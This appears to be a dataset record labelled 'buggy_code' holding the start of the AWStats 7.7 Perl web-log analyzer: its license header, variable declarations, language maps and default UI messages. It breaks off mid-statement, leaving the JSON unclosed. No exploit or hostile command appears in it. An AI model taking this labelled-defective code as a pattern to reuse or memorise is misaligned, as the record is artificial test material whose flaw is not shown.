{"buggy_code": ["#!/usr/bin/perl\n#------------------------------------------------------------------------------\n# Free realtime web server logfile analyzer to show advanced web statistics.\n# Works from command line or as a CGI. You must use this script as often as\n# necessary from your scheduler to update your statistics and from command\n# line or a browser to read report results.\n# See AWStats documentation (in docs/ directory) for all setup instructions.\n#\n# This program is free software; you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation; either version 2 of the License, or\n# (at your option) any later version.\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with this program. If not, see <http://www.gnu.org/licenses/>.\n#------------------------------------------------------------------------------\nrequire 5.007;\n\n#$|=1;\n#use warnings;\t\t# Must be used in test mode only. This reduce a little process speed\n#use diagnostics;\t# Must be used in test mode only. This reduce a lot of process speed\nuse strict;\nno strict \"refs\";\nuse Time::Local\n  ; # use Time::Local 'timelocal_nocheck' is faster but not supported by all Time::Local modules\nuse Socket;\nuse Encode;\nuse File::Spec;\n\n\n#------------------------------------------------------------------------------\n# Defines\n#------------------------------------------------------------------------------\nuse vars qw/ $REVISION $VERSION /;\n$REVISION = '20161204';\n$VERSION  = \"7.7 (build $REVISION)\";\n\n# ----- Constants -----\nuse vars qw/\n  $DEBUGFORCED $NBOFLINESFORBENCHMARK $FRAMEWIDTH $NBOFLASTUPDATELOOKUPTOSAVE\n  $LIMITFLUSH $NEWDAYVISITTIMEOUT $VISITTIMEOUT $NOTSORTEDRECORDTOLERANCE\n  $WIDTHCOLICON $TOOLTIPON\n  $lastyearbeforeupdate $lastmonthbeforeupdate $lastdaybeforeupdate $lasthourbeforeupdate $lastdatebeforeupdate\n  $NOHTML\n  /;\n$DEBUGFORCED = 0\n  ; # Force debug level to log lesser level into debug.log file (Keep this value to 0)\n$NBOFLINESFORBENCHMARK = 8192\n  ; # Benchmark info are printing every NBOFLINESFORBENCHMARK lines (Must be a power of 2)\n$FRAMEWIDTH = 240;    # Width of left frame when UseFramesWhenCGI is on\n$NBOFLASTUPDATELOOKUPTOSAVE =\n  500;                # Nb of records to save in DNS last update cache file\n$LIMITFLUSH =\n  5000;   # Nb of records in data arrays after how we need to flush data on disk\n$NEWDAYVISITTIMEOUT = 764041;    # Delay between 01-23:59:59 and 02-00:00:00\n$VISITTIMEOUT       = 10000\n  ; # Lapse of time to consider a page load as a new visit. 10000 = 1 hour (Default = 10000)\n$NOTSORTEDRECORDTOLERANCE = 20000\n  ; # Lapse of time to accept a record if not in correct order. 20000 = 2 hour (Default = 20000)\n$WIDTHCOLICON = 32;\n$TOOLTIPON    = 0;    # Tooltips plugin loaded\n$NOHTML       = 0;    # Suppress the html headers\n\n# ----- Running variables -----\nuse vars qw/\n  $DIR $PROG $Extension\n  $Debug $ShowSteps\n  $DebugResetDone $DNSLookupAlreadyDone\n  $RunAsCli $UpdateFor $HeaderHTTPSent $HeaderHTMLSent\n  $LastLine $LastLineNumber $LastLineOffset $LastLineChecksum $LastUpdate\n  $lowerval\n  $PluginMode\n  $MetaRobot\n  $AverageVisits $AveragePages $AverageHits $AverageBytes\n  $TotalUnique $TotalVisits $TotalHostsKnown $TotalHostsUnknown\n  $TotalPages $TotalHits $TotalBytes $TotalHitsErrors\n  $TotalNotViewedPages $TotalNotViewedHits $TotalNotViewedBytes\n  $TotalEntries $TotalExits $TotalBytesPages $TotalDifferentPages\n  $TotalKeyphrases $TotalKeywords $TotalDifferentKeyphrases $TotalDifferentKeywords\n  $TotalSearchEnginesPages $TotalSearchEnginesHits $TotalRefererPages $TotalRefererHits $TotalDifferentSearchEngines $TotalDifferentReferer\n  $FrameName $Center $FileConfig $FileSuffix $Host $YearRequired $MonthRequired $DayRequired $HourRequired\n  $QueryString $SiteConfig $StaticLinks $PageCode $PageDir $PerlParsingFormat $UserAgent\n  $pos_vh $pos_host $pos_logname $pos_date $pos_tz $pos_method $pos_url $pos_code $pos_size\n  $pos_referer $pos_agent $pos_query $pos_gzipin $pos_gzipout $pos_compratio $pos_timetaken\n  $pos_cluster $pos_emails $pos_emailr $pos_hostr @pos_extra\n  /;\n$DIR = $PROG = $Extension = '';\n$Debug          = $ShowSteps            = 0;\n$DebugResetDone = $DNSLookupAlreadyDone = 0;\n$RunAsCli       = $UpdateFor            = $HeaderHTTPSent = $HeaderHTMLSent = 0;\n$LastLine = $LastLineNumber = $LastLineOffset = $LastLineChecksum = 0;\n$LastUpdate          = 0;\n$lowerval            = 0;\n$PluginMode          = '';\n$MetaRobot           = 0;\n$AverageVisits = $AveragePages = $AverageHits = $AverageBytes = 0; \n$TotalUnique         = $TotalVisits = $TotalHostsKnown = $TotalHostsUnknown = 0;\n$TotalPages          = $TotalHits = $TotalBytes = $TotalHitsErrors = 0;\n$TotalNotViewedPages = $TotalNotViewedHits = $TotalNotViewedBytes = 0;\n$TotalEntries = $TotalExits = $TotalBytesPages = $TotalDifferentPages = 0;\n$TotalKeyphrases = $TotalKeywords = $TotalDifferentKeyphrases = 0;\n$TotalDifferentKeywords = 0;\n$TotalSearchEnginesPages = $TotalSearchEnginesHits = $TotalRefererPages = 0;\n$TotalRefererHits = $TotalDifferentSearchEngines = $TotalDifferentReferer = 0;\n(\n\t$FrameName,    $Center,       $FileConfig,        $FileSuffix,\n\t$Host,         $YearRequired, $MonthRequired,     $DayRequired,\n\t$HourRequired, $QueryString,  $SiteConfig,        $StaticLinks,\n\t$PageCode,     $PageDir,      $PerlParsingFormat, $UserAgent\n  )\n  = ( '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '' );\n\n# ----- Plugins variable -----\nuse vars qw/ %PluginsLoaded $PluginDir $AtLeastOneSectionPlugin /;\n%PluginsLoaded           = ();\n$PluginDir               = '';\n$AtLeastOneSectionPlugin = 0;\n\n# ----- Time vars -----\nuse vars qw/\n  $starttime\n  $nowtime $tomorrowtime\n  $nowweekofmonth $nowweekofyear $nowdaymod $nowsmallyear\n  $nowsec $nowmin $nowhour $nowday $nowmonth $nowyear $nowwday $nowyday $nowns\n  $StartSeconds $StartMicroseconds\n  /;\n$StartSeconds = $StartMicroseconds = 0;\n\n# ----- Variables for config file reading -----\nuse vars qw/\n  $FoundNotPageList\n  /;\n$FoundNotPageList = 0;\n\n# ----- Config file variables -----\nuse vars qw/\n  $StaticExt\n  $DNSStaticCacheFile\n  $DNSLastUpdateCacheFile\n  $MiscTrackerUrl\n  $Lang\n  $MaxRowsInHTMLOutput\n  $MaxLengthOfShownURL\n  $MaxLengthOfStoredURL\n  $MaxLengthOfStoredUA\n  %BarPng\n  $BuildReportFormat\n  $BuildHistoryFormat\n  $ExtraTrackedRowsLimit\n  $DatabaseBreak\n  $SectionsToBeSaved\n  /;\n$StaticExt              = 'html';\n$DNSStaticCacheFile     = 'dnscache.txt';\n$DNSLastUpdateCacheFile = 'dnscachelastupdate.txt';\n$MiscTrackerUrl         = '/js/awstats_misc_tracker.js';\n$Lang                   = 'auto';\n$SectionsToBeSaved      = 'all';\n$MaxRowsInHTMLOutput    = 1000;\n$MaxLengthOfShownURL    = 64;\n$MaxLengthOfStoredURL = 256;  # Note: Apache LimitRequestLine is default to 8190\n$MaxLengthOfStoredUA  = 256;\n%BarPng               = (\n\t'vv' => 'vv.png',\n\t'vu' => 'vu.png',\n\t'hu' => 'hu.png',\n\t'vp' => 'vp.png',\n\t'hp' => 'hp.png',\n\t'he' => 'he.png',\n\t'hx' => 'hx.png',\n\t'vh' => 'vh.png',\n\t'hh' => 'hh.png',\n\t'vk' => 'vk.png',\n\t'hk' => 'hk.png'\n);\n$BuildReportFormat     = 'html';\n$BuildHistoryFormat    = 'text';\n$ExtraTrackedRowsLimit = 500;\n$DatabaseBreak         = 'month';\nuse vars qw/\n  $DebugMessages $AllowToUpdateStatsFromBrowser $EnableLockForUpdate $DNSLookup $DynamicDNSLookup $AllowAccessFromWebToAuthenticatedUsersOnly\n  $BarHeight $BarWidth $CreateDirDataIfNotExists $KeepBackupOfHistoricFiles\n  $NbOfLinesParsed $NbOfLinesDropped $NbOfLinesCorrupted $NbOfLinesComment $NbOfLinesBlank $NbOfOldLines $NbOfNewLines\n  $NbOfLinesShowsteps $NewLinePhase $NbOfLinesForCorruptedLog $PurgeLogFile $ArchiveLogRecords\n  $ShowDropped $ShowCorrupted $ShowUnknownOrigin $ShowDirectOrigin $ShowLinksToWhoIs\n  $ShowAuthenticatedUsers $ShowFileSizesStats $ShowScreenSizeStats $ShowSMTPErrorsStats\n  $ShowEMailSenders $ShowEMailReceivers $ShowWormsStats $ShowClusterStats\n  $IncludeInternalLinksInOriginSection\n  $AuthenticatedUsersNotCaseSensitive\n  $Expires $UpdateStats $MigrateStats $URLNotCaseSensitive $URLWithQuery $URLReferrerWithQuery\n  $DecodeUA $DecodePunycode\n  /;\n(\n\t$DebugMessages,\n\t$AllowToUpdateStatsFromBrowser,\n\t$EnableLockForUpdate,\n\t$DNSLookup,\n\t$DynamicDNSLookup,\n\t$AllowAccessFromWebToAuthenticatedUsersOnly,\n\t$BarHeight,\n\t$BarWidth,\n\t$CreateDirDataIfNotExists,\n\t$KeepBackupOfHistoricFiles,\n\t$NbOfLinesParsed,\n\t$NbOfLinesDropped,\n\t$NbOfLinesCorrupted,\n\t$NbOfLinesComment,\n\t$NbOfLinesBlank,\n\t$NbOfOldLines,\n\t$NbOfNewLines,\n\t$NbOfLinesShowsteps,\n\t$NewLinePhase,\n\t$NbOfLinesForCorruptedLog,\n\t$PurgeLogFile,\n\t$ArchiveLogRecords,\n\t$ShowDropped,\n\t$ShowCorrupted,\n\t$ShowUnknownOrigin,\n\t$ShowDirectOrigin,\n\t$ShowLinksToWhoIs,\n\t$ShowAuthenticatedUsers,\n\t$ShowFileSizesStats,\n\t$ShowScreenSizeStats,\n\t$ShowSMTPErrorsStats,\n\t$ShowEMailSenders,\n\t$ShowEMailReceivers,\n\t$ShowWormsStats,\n\t$ShowClusterStats,\n\t$IncludeInternalLinksInOriginSection,\n\t$AuthenticatedUsersNotCaseSensitive,\n\t$Expires,\n\t$UpdateStats,\n\t$MigrateStats,\n\t$URLNotCaseSensitive,\n\t$URLWithQuery,\n\t$URLReferrerWithQuery,\n\t$DecodeUA,\n\t$DecodePunycode\n  )\n  = (\n\t0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\n\t0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0\n  );\nuse vars qw/\n  $DetailedReportsOnNewWindows\n  $FirstDayOfWeek $KeyWordsNotSensitive $SaveDatabaseFilesWithPermissionsForEveryone\n  $WarningMessages $ShowLinksOnUrl $UseFramesWhenCGI\n  $ShowMenu $ShowSummary $ShowMonthStats $ShowDaysOfMonthStats $ShowDaysOfWeekStats\n  $ShowHoursStats $ShowDomainsStats $ShowHostsStats\n  $ShowRobotsStats $ShowSessionsStats $ShowPagesStats $ShowFileTypesStats $ShowDownloadsStats\n  $ShowOSStats $ShowBrowsersStats $ShowOriginStats\n  $ShowKeyphrasesStats $ShowKeywordsStats $ShowMiscStats $ShowHTTPErrorsStats $ShowHTTPErrorsPageDetail\n  $AddDataArrayMonthStats $AddDataArrayShowDaysOfMonthStats $AddDataArrayShowDaysOfWeekStats $AddDataArrayShowHoursStats\n  /;\n(\n\t$DetailedReportsOnNewWindows,\n\t$FirstDayOfWeek,\n\t$KeyWordsNotSensitive,\n\t$SaveDatabaseFilesWithPermissionsForEveryone,\n\t$WarningMessages,\n\t$ShowLinksOnUrl,\n\t$UseFramesWhenCGI,\n\t$ShowMenu,\n\t$ShowSummary,\n\t$ShowMonthStats,\n\t$ShowDaysOfMonthStats,\n\t$ShowDaysOfWeekStats,\n\t$ShowHoursStats,\n\t$ShowDomainsStats,\n\t$ShowHostsStats,\n\t$ShowRobotsStats,\n\t$ShowSessionsStats,\n\t$ShowPagesStats,\n\t$ShowFileTypesStats,\n\t$ShowDownloadsStats,\n\t$ShowOSStats,\n\t$ShowBrowsersStats,\n\t$ShowOriginStats,\n\t$ShowKeyphrasesStats,\n\t$ShowKeywordsStats,\n\t$ShowMiscStats,\n\t$ShowHTTPErrorsStats,\n\t$ShowHTTPErrorsPageDetail,\n\t$AddDataArrayMonthStats,\n\t$AddDataArrayShowDaysOfMonthStats,\n\t$AddDataArrayShowDaysOfWeekStats,\n\t$AddDataArrayShowHoursStats\n  )\n  = (\n\t1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1,\n\t1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1\n  );\nuse vars qw/\n  $AllowFullYearView\n  $LevelForRobotsDetection $LevelForWormsDetection $LevelForBrowsersDetection $LevelForOSDetection $LevelForRefererAnalyze\n  $LevelForFileTypesDetection $LevelForSearchEnginesDetection $LevelForKeywordsDetection\n  /;\n(\n\t$AllowFullYearView,          $LevelForRobotsDetection,\n\t$LevelForWormsDetection,     $LevelForBrowsersDetection,\n\t$LevelForOSDetection,        $LevelForRefererAnalyze,\n\t$LevelForFileTypesDetection, $LevelForSearchEnginesDetection,\n\t$LevelForKeywordsDetection\n  )\n  = ( 2, 2, 0, 2, 2, 2, 2, 2, 2 );\nuse vars qw/\n  $DirLock $DirCgi $DirConfig $DirData $DirIcons $DirLang $AWScript $ArchiveFileName\n  $AllowAccessFromWebToFollowingIPAddresses $HTMLHeadSection $HTMLEndSection $LinksToWhoIs $LinksToIPWhoIs\n  $LogFile $LogType $LogFormat $LogSeparator $Logo $LogoLink $StyleSheet $WrapperScript $SiteDomain\n  $UseHTTPSLinkForUrl $URLQuerySeparators $URLWithAnchor $ErrorMessages $ShowFlagLinks\n  $AddLinkToExternalCGIWrapper\n  /;\n(\n\t$DirLock,                                  $DirCgi,\n\t$DirConfig,                                $DirData,\n\t$DirIcons,                                 $DirLang,\n\t$AWScript,                                 $ArchiveFileName,\n\t$AllowAccessFromWebToFollowingIPAddresses, $HTMLHeadSection,\n\t$HTMLEndSection,                           $LinksToWhoIs,\n\t$LinksToIPWhoIs,                           $LogFile,\n\t$LogType,                                  $LogFormat,\n\t$LogSeparator,                             $Logo,\n\t$LogoLink,                                 $StyleSheet,\n\t$WrapperScript,                            $SiteDomain,\n\t$UseHTTPSLinkForUrl,                       $URLQuerySeparators,\n\t$URLWithAnchor,                            $ErrorMessages,\n\t$ShowFlagLinks,                            $AddLinkToExternalCGIWrapper\n  )\n  = (\n\t'', '', '', '', '', '', '', '', '', '', '', '', '', '',\n\t'', '', '', '', '', '', '', '', '', '', '', '', '', '', ''\n  );\nuse vars qw/\n  $color_Background $color_TableBG $color_TableBGRowTitle\n  $color_TableBGTitle $color_TableBorder $color_TableRowTitle $color_TableTitle\n  $color_text $color_textpercent $color_titletext $color_weekend $color_link $color_hover $color_other\n  $color_h $color_k $color_p $color_e $color_x $color_s $color_u $color_v\n  /;\n(\n\t$color_Background,   $color_TableBG,     $color_TableBGRowTitle,\n\t$color_TableBGTitle, $color_TableBorder, $color_TableRowTitle,\n\t$color_TableTitle,   $color_text,        $color_textpercent,\n\t$color_titletext,    $color_weekend,     $color_link,\n\t$color_hover,        $color_other,       $color_h,\n\t$color_k,            $color_p,           $color_e,\n\t$color_x,            $color_s,           $color_u,\n\t$color_v\n  )\n  = (\n\t'', '', '', '', '', '', '', '', '', '', '', '',\n\t'', '', '', '', '', '', '', '', '', ''\n  );\n\n# ---------- Init arrays --------\nuse vars qw/\n  @RobotsSearchIDOrder_list1 @RobotsSearchIDOrder_list2 @RobotsSearchIDOrder_listgen\n  @SearchEnginesSearchIDOrder_list1 @SearchEnginesSearchIDOrder_list2 @SearchEnginesSearchIDOrder_listgen\n  @BrowsersSearchIDOrder @OSSearchIDOrder @WordsToCleanSearchUrl\n  @WormsSearchIDOrder\n  @RobotsSearchIDOrder @SearchEnginesSearchIDOrder\n  @_from_p @_from_h\n  @_time_p @_time_h @_time_k @_time_nv_p @_time_nv_h @_time_nv_k\n  @DOWIndex @fieldlib @keylist\n  /;\n@RobotsSearchIDOrder = @SearchEnginesSearchIDOrder = ();\n@_from_p = @_from_h = ();\n@_time_p = @_time_h = @_time_k = @_time_nv_p = @_time_nv_h = @_time_nv_k = ();\n@DOWIndex = @fieldlib = @keylist = ();\nuse vars qw/\n  @MiscListOrder %MiscListCalc\n  %OSFamily %BrowsersFamily @SessionsRange %SessionsAverage\n  %LangBrowserToLangAwstats %LangAWStatsToFlagAwstats %BrowsersSafariBuildToVersionHash\n  @HostAliases @AllowAccessFromWebToFollowingAuthenticatedUsers\n  @DefaultFile @SkipDNSLookupFor\n  @SkipHosts @SkipUserAgents @SkipFiles @SkipReferrers @NotPageFiles\n  @OnlyHosts @OnlyUserAgents @OnlyFiles @OnlyUsers\n  @URLWithQueryWithOnly @URLWithQueryWithout\n  @ExtraName @ExtraCondition @ExtraStatTypes @MaxNbOfExtra @MinHitExtra\n  @ExtraFirstColumnTitle @ExtraFirstColumnValues @ExtraFirstColumnFunction @ExtraFirstColumnFormat\n  @ExtraCodeFilter @ExtraConditionType @ExtraConditionTypeVal\n  @ExtraFirstColumnValuesType @ExtraFirstColumnValuesTypeVal\n  @ExtraAddAverageRow @ExtraAddSumRow\n  @PluginsToLoad\n  /;\n@MiscListOrder = (\n\t'AddToFavourites',  'JavascriptDisabled',\n\t'JavaEnabled',      'DirectorSupport',\n\t'FlashSupport',     'RealPlayerSupport',\n\t'QuickTimeSupport', 'WindowsMediaPlayerSupport',\n\t'PDFSupport'\n);\n%MiscListCalc = (\n\t'TotalMisc'                 => '',\n\t'AddToFavourites'           => 'u',\n\t'JavascriptDisabled'        => 'hm',\n\t'JavaEnabled'               => 'hm',\n\t'DirectorSupport'           => 'hm',\n\t'FlashSupport'              => 'hm',\n\t'RealPlayerSupport'         => 'hm',\n\t'QuickTimeSupport'          => 'hm',\n\t'WindowsMediaPlayerSupport' => 'hm',\n\t'PDFSupport'                => 'hm'\n);\n@SessionsRange =\n  ( '0s-30s', '30s-2mn', '2mn-5mn', '5mn-15mn', '15mn-30mn', '30mn-1h', '1h+' );\n%SessionsAverage = (\n\t'0s-30s',   15,  '30s-2mn',   75,   '2mn-5mn', 210,\n\t'5mn-15mn', 600, '15mn-30mn', 1350, '30mn-1h', 2700,\n\t'1h+',      3600\n);\n\n# HTTP-Accept or Lang parameter => AWStats code to use for lang\n# ISO-639-1 or 2 or other       => awstats-xx.txt where xx is ISO-639-1\n%LangBrowserToLangAwstats = (\n\t'sq'    => 'al',\n\t'ar'    => 'ar',\n\t'ba'    => 'ba',\n\t'bg'    => 'bg',\n\t'zh-tw' => 'tw',\n\t'zh'    => 'cn',\n\t'cs'    => 'cz',\n\t'de'    => 'de',\n\t'da'    => 'dk',\n\t'en'    => 'en',\n\t'et'    => 'et',\n\t'fi'    => 'fi',\n\t'fr'    => 'fr',\n\t'gl'    => 'gl',\n\t'es'    => 'es',\n\t'eu'    => 'eu',\n\t'ca'    => 'ca',\n\t'el'    => 'gr',\n\t'hu'    => 'hu',\n\t'is'    => 'is',\n\t'in'    => 'id',\n\t'it'    => 'it',\n\t'ja'    => 'jp',\n\t'kr'    => 'ko',\n\t'lv'    => 'lv',\n\t'nl'    => 'nl',\n\t'no'    => 'nb',\n\t'nb'    => 'nb',\n\t'nn'    => 'nn',\n\t'pl'    => 'pl',\n\t'pt'    => 'pt',\n\t'pt-br' => 'br',\n\t'ro'    => 'ro',\n\t'ru'    => 'ru',\n\t'sr'    => 'sr',\n\t'sk'    => 'sk',\n\t'sv'    => 'se',\n\t'th'    => 'th',\n\t'tr'    => 'tr',\n\t'uk'    => 'ua',\n\t'cy'    => 'cy',\n\t'wlk'   => 'cy'\n);\n%LangAWStatsToFlagAwstats =\n  (  # If flag (country ISO-3166 two letters) is not same than AWStats Lang code\n\t'ca' => 'es_cat',\n\t'et' => 'ee',\n\t'eu' => 'es_eu',\n\t'cy' => 'wlk',\n\t'gl' => 'glg',\n\t'he' => 'il',\n\t'ko' => 'kr',\n\t'ar' => 'sa',\n\t'sr' => 'cs'\n  );\n\n@HostAliases = @AllowAccessFromWebToFollowingAuthenticatedUsers = ();\n@DefaultFile = @SkipDNSLookupFor = ();\n@SkipHosts = @SkipUserAgents = @NotPageFiles = @SkipFiles = @SkipReferrers = ();\n@OnlyHosts = @OnlyUserAgents = @OnlyFiles = @OnlyUsers = ();\n@URLWithQueryWithOnly     = @URLWithQueryWithout    = ();\n@ExtraName                = @ExtraCondition         = @ExtraStatTypes = ();\n@MaxNbOfExtra             = @MinHitExtra            = ();\n@ExtraFirstColumnTitle    = @ExtraFirstColumnValues = ();\n@ExtraFirstColumnFunction = @ExtraFirstColumnFormat = ();\n@ExtraCodeFilter = @ExtraConditionType = @ExtraConditionTypeVal = ();\n@ExtraFirstColumnValuesType = @ExtraFirstColumnValuesTypeVal = ();\n@ExtraAddAverageRow         = @ExtraAddSumRow                = ();\n@PluginsToLoad              = ();\n\n# ---------- Init hash arrays --------\nuse vars qw/\n  %BrowsersHashIDLib %BrowsersHashIcon %BrowsersHereAreGrabbers\n  %DomainsHashIDLib\n  %MimeHashLib %MimeHashFamily\n  %OSHashID %OSHashLib\n  %RobotsHashIDLib %RobotsAffiliateLib\n  %SearchEnginesHashID %SearchEnginesHashLib %SearchEnginesWithKeysNotInQuery %SearchEnginesKnownUrl %NotSearchEnginesKeys\n  %WormsHashID %WormsHashLib %WormsHashTarget\n  /;\nuse vars qw/\n  %HTMLOutput %NoLoadPlugin %FilterIn %FilterEx\n  %BadFormatWarning\n  %MonthNumLib\n  %ValidHTTPCodes %ValidSMTPCodes\n  %TrapInfosForHTTPErrorCodes %NotPageList %DayBytes %DayHits %DayPages %DayVisits\n  %MaxNbOf %MinHit\n  %ListOfYears %HistoryAlreadyFlushed %PosInFile %ValueInFile\n  %val %nextval %egal\n  %TmpDNSLookup %TmpOS %TmpRefererServer %TmpRobot %TmpBrowser %MyDNSTable\n  /;\n%HTMLOutput = %NoLoadPlugin = %FilterIn = %FilterEx = ();\n%BadFormatWarning           = ();\n%MonthNumLib                = ();\n%ValidHTTPCodes             = %ValidSMTPCodes = ();\n%TrapInfosForHTTPErrorCodes = ();\n%NotPageList = ();\n%DayBytes    = %DayHits               = %DayPages  = %DayVisits   = ();\n%MaxNbOf     = %MinHit                = ();\n%ListOfYears = %HistoryAlreadyFlushed = %PosInFile = %ValueInFile = ();\n%val = %nextval = %egal = ();\n%TmpDNSLookup = %TmpOS = %TmpRefererServer = %TmpRobot = %TmpBrowser = ();\n%MyDNSTable = ();\nuse vars qw/\n  %FirstTime %LastTime\n  %MonthHostsKnown %MonthHostsUnknown\n  %MonthUnique %MonthVisits\n  %MonthPages %MonthHits %MonthBytes\n  %MonthNotViewedPages %MonthNotViewedHits %MonthNotViewedBytes\n  %_session %_browser_h %_browser_p\n  %_domener_p %_domener_h %_domener_k %_errors_h %_errors_k\n  %_filetypes_h %_filetypes_k %_filetypes_gz_in %_filetypes_gz_out\n  %_host_p %_host_h %_host_k %_host_l %_host_s %_host_u\n  %_waithost_e %_waithost_l %_waithost_s %_waithost_u\n  %_keyphrases %_keywords %_os_h %_os_p %_pagesrefs_p %_pagesrefs_h %_robot_h %_robot_k %_robot_l %_robot_r\n  %_worm_h %_worm_k %_worm_l %_login_h %_login_p %_login_k %_login_l %_screensize_h\n  %_misc_p %_misc_h %_misc_k\n  %_cluster_p %_cluster_h %_cluster_k\n  %_se_referrals_p %_se_referrals_h %_sider_h %_referer_h %_err_host_h %_url_p %_url_k %_url_e %_url_x\n  %_downloads\n  %_unknownreferer_l %_unknownrefererbrowser_l\n  %_emails_h %_emails_k %_emails_l %_emailr_h %_emailr_k %_emailr_l\n  /;\n&Init_HashArray();\n\n# ---------- Init Regex --------\nuse vars qw/ $regclean1 $regclean2 $regdate /;\n$regclean1 = qr/<(recnb|\\/td)>/i;\n$regclean2 = qr/<\\/?[^<>]+>/i;\n$regdate   = qr/(\\d\\d\\d\\d)(\\d\\d)(\\d\\d)(\\d\\d)(\\d\\d)(\\d\\d)/;\n\n# ---------- Init Tie::hash arrays --------\n# Didn't find a tie that increase speed\n#use Tie::StdHash;\n#use Tie::Cache::LRU;\n#tie %_host_p, 'Tie::StdHash';\n#tie %TmpOS, 'Tie::Cache::LRU';\n\n# PROTOCOL CODES\nuse vars qw/ %httpcodelib %ftpcodelib %smtpcodelib /;\n\n# DEFAULT MESSAGE\nuse vars qw/ @Message /;\n@Message = (\n\t'Unknown',\n\t'Unknown (unresolved ip)',\n\t'Others',\n\t'View details',\n\t'Day',\n\t'Month',\n\t'Year',\n\t'Statistics for',\n\t'First visit',\n\t'Last visit',\n\t'Number of visits',\n\t'Unique visitors',\n\t'Visit',\n\t'different keywords',\n\t'Search',\n\t'Percent',\n\t'Traffic',\n\t'Domains/Countries',\n\t'Visitors',\n\t'Pages-URL',\n\t'Hours',\n\t'Browsers',\n\t'',\n\t'Referers',\n\t'Never updated (See \\'Build/Update\\' on awstats_setup.html page)',\n\t'Visitors domains/countries',\n\t'hosts',\n\t'pages',\n\t'different pages-url',\n\t'Viewed',\n\t'Other words',\n\t'Pages not found',\n\t'HTTP Error codes',\n\t'Netscape versions',\n\t'IE versions',\n\t'Last Update',\n\t'Connect to site from',\n\t'Origin',\n\t'Direct address / Bookmarks',\n\t'Origin unknown',\n\t'Links from an Internet Search Engine',\n\t'Links from an external page (other web sites except search engines)',\n\t'Links from an internal page (other page on same site)',\n\t'Keyphrases used on search engines',\n\t'Keywords used on search engines',\n\t'Unresolved IP Address',\n\t'Unknown OS (Referer field)',\n\t'Required but not found URLs (HTTP code 404)',\n\t'IP Address',\n\t'Error&nbsp;Hits',\n\t'Unknown browsers (Referer field)',\n\t'different robots',\n\t'visits/visitor',\n\t'Robots/Spiders visitors',\n\t'Free realtime logfile analyzer for advanced web statistics',\n\t'of',\n\t'Pages',\n\t'Hits',\n\t'Versions',\n\t'Operating Systems',\n\t'Jan',\n\t'Feb',\n\t'Mar',\n\t'Apr',\n\t'May',\n\t'Jun',\n\t'Jul',\n\t'Aug',\n\t'Sep',\n\t'Oct',\n\t'Nov',\n\t'Dec',\n\t'Navigation',\n\t'File type',\n\t'Update now',\n\t'Bandwidth',\n\t'Back to main page',\n\t'Top',\n\t'dd mmm yyyy - HH:MM',\n\t'Filter',\n\t'Full list',\n\t'Hosts',\n\t'Known',\n\t'Robots',\n\t'Sun',\n\t'Mon',\n\t'Tue',\n\t'Wed',\n\t'Thu',\n\t'Fri',\n\t'Sat',\n\t'Days of week',\n\t'Who',\n\t'When',\n\t'Authenticated users',\n\t'Min',\n\t'Average',\n\t'Max',\n\t'Web compression',\n\t'Bandwidth saved',\n\t'Compression on',\n\t'Compression result',\n\t'Total',\n\t'different keyphrases',\n\t'Entry',\n\t'Code',\n\t'Average size',\n\t'Links from a NewsGroup',\n\t'KB',\n\t'MB',\n\t'GB',\n\t'Grabber',\n\t'Yes',\n\t'No',\n\t'Info.',\n\t'OK',\n\t'Exit',\n\t'Visits duration',\n\t'Close window',\n\t'Bytes',\n\t'Search&nbsp;Keyphrases',\n\t'Search&nbsp;Keywords',\n\t'different refering search engines',\n\t'different refering sites',\n\t'Other phrases',\n\t'Other logins (and/or anonymous users)',\n\t'Refering search engines',\n\t'Refering sites',\n\t'Summary',\n\t'Exact value not available in \"Year\" view',\n\t'Data value arrays',\n\t'Sender EMail',\n\t'Receiver EMail',\n\t'Reported period',\n\t'Extra/Marketing',\n\t'Screen sizes',\n\t'Worm/Virus attacks',\n\t'Hit on favorite icon',\n\t'Days of month',\n\t'Miscellaneous',\n\t'Browsers with Java support',\n\t'Browsers with Macromedia Director Support',\n\t'Browsers with Flash Support',\n\t'Browsers with Real audio playing support',\n\t'Browsers with Quictime audio playing support',\n\t'Browsers with Windows Media audio playing support',\n\t'Browsers with PDF support',\n\t'SMTP Error codes',\n\t'Countries',\n\t'Mails',\n\t'Size',\n\t'First',\n\t'Last',\n\t'Exclude filter',\n'Codes shown here gave hits or traffic \"not viewed\" by visitors, so they are not included in other charts.',\n\t'Cluster',\n'Robots shown here gave hits or traffic \"not viewed\" by visitors, so they are not included in other charts.',\n\t'Numbers after + are successful hits on \"robots.txt\" files',\n'Worms shown here gave hits or traffic \"not viewed\" by visitors, so thay are not included in other charts.',\n'Not viewed traffic includes traffic generated by robots, worms, or replies with special HTTP status codes.',\n\t'Traffic viewed',\n\t'Traffic not viewed',\n\t'Monthly history',\n\t'Worms',\n\t'different worms',\n\t'Mails successfully sent',\n\t'Mails failed/refused',\n\t'Sensitive targets',\n\t'Javascript disabled',\n\t'Created by',\n\t'plugins',\n\t'Regions',\n\t'Cities',\n\t'Opera versions',\n\t'Safari versions',\n\t'Chrome versions',\n\t'Konqueror versions',\n\t',',\n \t'Downloads',\n \t'Export CSV'\n);\n\n#------------------------------------------------------------------------------\n# Functions\n#------------------------------------------------------------------------------\n\n# Function to solve pb with openvms\nsub file_filt (@) {\n\tmy @retval;\n\tforeach my $fl (@_) {\n\t\t$fl =~ tr/^//d;\n\t\tpush @retval, $fl;\n\t}\n\treturn sort @retval;\n}\n\n#------------------------------------------------------------------------------\n# Function:\t\tWrite on output header of HTTP answer\n# Parameters:\tNone\n# Input:\t\t$HeaderHTTPSent $BuildReportFormat $PageCode $Expires\n# Output:\t\t$HeaderHTTPSent=1\n# Return:\t\tNone\n#------------------------------------------------------------------------------\nsub http_head {\n\tif ( !$HeaderHTTPSent ) {\n\t\tmy $newpagecode = $PageCode ? $PageCode : \"utf-8\";\n\t\tif ( $BuildReportFormat eq 'xhtml' || $BuildReportFormat eq 'xml' ) {\n\t\t\tprint( 